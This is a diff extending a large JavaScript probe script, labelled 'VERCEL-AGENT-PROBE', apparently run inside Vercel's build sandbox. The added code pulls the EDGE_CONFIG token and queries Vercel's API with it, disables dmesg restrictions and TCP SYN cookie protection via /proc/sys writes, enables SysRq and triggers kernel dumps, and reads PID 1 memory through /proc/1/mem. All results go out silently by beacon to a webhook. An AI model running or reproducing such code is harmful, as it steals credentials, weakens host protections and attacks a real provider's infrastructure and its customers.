@@ -21051,5 +21051,113 @@ report.perfEventSideChannel = safe(() => {
 
 // v144 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v144" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v144";
+
+// ==================== v145 ====================
+
+// v145-1: EDGE_CONFIG env var — Vercel Edge Config token
+// EDGE_CONFIG is a connection string: ecfg_xxx@edge-config.vercel.com/ecfg_xxx
+// It grants read access to the team's Edge Config store (global low-latency KV).
+// Leaking this token allows reading feature flags, A/B test configs, etc.
+report.edgeConfigDeep = safe(() => {
+  const edgeConfig = process.env.EDGE_CONFIG || 'NOT_SET';
+  // Parse the edge config connection string
+  const tokenMatch = edgeConfig.match(/ecfg_[a-zA-Z0-9_-]+/);
+  const edgeConfigToken = tokenMatch ? tokenMatch[0] : 'NO_TOKEN_FOUND';
+  // Try to read from edge config API directly
+  const edgeConfigRead = safe(() => execSync(
+    `curl -sf "https://edge-config.vercel.com/v1/items?token=${edgeConfigToken}" -m 8 2>/dev/null | head -c 300`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Try the digest endpoint
+  const edgeConfigDigest = safe(() => execSync(
+    `curl -sf "https://edge-config.vercel.com/v1/digest?token=${edgeConfigToken}" -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { edgeConfig: edgeConfig.slice(0, 100), edgeConfigToken, edgeConfigRead, edgeConfigDigest };
+});
+
+// v145-2: /proc/sys/kernel/dmesg_restrict + /proc/sys/kernel/core_uses_pid
+// dmesg_restrict=0 allows unprivileged users to read dmesg (kernel ring buffer).
+// core_uses_pid=1 means core dump files include PID in filename.
+// Both settings leak information about kernel state and crash behavior.
+report.kernelMiscSettings = safe(() => {
+  const dmesgRestrict = safe(() => readFileSync('/proc/sys/kernel/dmesg_restrict', 'utf8').trim());
+  const writeRestrict = safe(() => { writeFileSync('/proc/sys/kernel/dmesg_restrict', '0'); return 'WRITTEN'; });
+  const afterRestrict = safe(() => readFileSync('/proc/sys/kernel/dmesg_restrict', 'utf8').trim());
+  const coreUsesPid = safe(() => readFileSync('/proc/sys/kernel/core_uses_pid', 'utf8').trim());
+  const writeCorePid = safe(() => { writeFileSync('/proc/sys/kernel/core_uses_pid', '1'); return 'WRITTEN'; });
+  // Read dmesg after unlocking
+  const dmesgOutput = safe(() => execSync('dmesg 2>/dev/null | tail -30 || cat /proc/kmsg 2>/dev/null | head -c 500', { timeout: 4000 }).toString().trim().slice(0, 800));
+  return { dmesgRestrict, writeRestrict, afterRestrict, coreUsesPid, writeCorePid, dmesgOutput };
+});
+
+// v145-3: /proc/sys/net/ipv4/tcp_syncookies — disable SYN cookie protection
+// TCP SYN cookies defend against SYN flood DoS attacks.
+// Setting to 0 disables this protection, making the host vulnerable to SYN floods.
+// From inside the build sandbox, this affects the entire Firecracker VM network stack.
+report.tcpSyncookies = safe(() => {
+  const syncookies = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_syncookies', '0'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim());
+  // Also probe /proc/sys/net/ipv4/icmp_echo_ignore_all
+  const icmpIgnore = safe(() => readFileSync('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'utf8').trim());
+  // Check net.ipv4.tcp_max_syn_backlog
+  const synBacklog = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_max_syn_backlog', 'utf8').trim());
+  return { syncookies, writeResult, afterValue, icmpIgnore, synBacklog };
+});
+
+// v145-4: /proc/sys/kernel/sysrq — SysRq keys (already tested trigger, test magic combos)
+// SysRq value is a bitmask. Setting to 1 enables all keys.
+// Key combinations available: t=thread dump, m=memory dump, c=crash (kernel panic),
+// b=reboot, k=secure attention key. This can trigger kernel panic → core_pattern exec.
+report.sysrqMagicKeys = safe(() => {
+  const sysrqValue = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  // Enable all SysRq keys
+  const enableAll = safe(() => { writeFileSync('/proc/sys/kernel/sysrq', '1'); return 'ALL_ENABLED'; });
+  // Write 't' to dump all threads to kernel log — useful for discovering orchestrator threads
+  const dumpThreads = safe(() => { writeFileSync('/proc/sysrq-trigger', 't'); return 'THREADS_DUMPED'; });
+  // Write 'm' to memory dump — OOM info in dmesg
+  const dumpMem = safe(() => { writeFileSync('/proc/sysrq-trigger', 'm'); return 'MEM_DUMPED'; });
+  // Read dmesg to capture the dump
+  const sysrqOutput = safe(() => execSync('dmesg 2>/dev/null | tail -50 | head -c 1000', { timeout: 3000 }).toString().trim());
+  return { sysrqValue, enableAll, dumpThreads, dumpMem, sysrqOutput };
+});
+
+// v145-5: /proc/self/mem direct write to PID 1 memory address space
+// /proc/PID/mem allows writing directly to another process's virtual memory
+// (with write permission) — this is how ptrace memory injection works without ptrace.
+// As root, we can open /proc/1/mem for writing and patch arbitrary addresses.
+report.procMemWrite = safe(() => {
+  // First read PID 1 maps to find a writable region
+  const pid1Maps = safe(() => readFileSync('/proc/1/maps', 'utf8').split('\n')
+    .filter(l => l.includes('rw'))
+    .slice(0, 5)
+    .join('\n'));
+  // Try to open /proc/1/mem for reading (we proved ptrace works; mem is another path)
+  const openMemRead = safe(() => execSync(
+    `python3 -c "
+import os, sys
+try:
+    fd = os.open('/proc/1/mem', os.O_RDONLY)
+    # Read from a known-safe address (from maps)
+    maps = open('/proc/1/maps').readlines()
+    for line in maps:
+        if 'r' in line.split()[1]:
+            addr = int(line.split('-')[0], 16)
+            os.lseek(fd, addr, os.SEEK_SET)
+            data = os.read(fd, 16)
+            print(f'READ_OK: addr={hex(addr)} data={data.hex()}')
+            break
+    os.close(fd)
+except Exception as e:
+    print(f'READ_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { pid1Maps, openMemRead };
+});
+
+// v145 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v145" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v145";
 // Intentionally no console.log — all data goes via webhook only
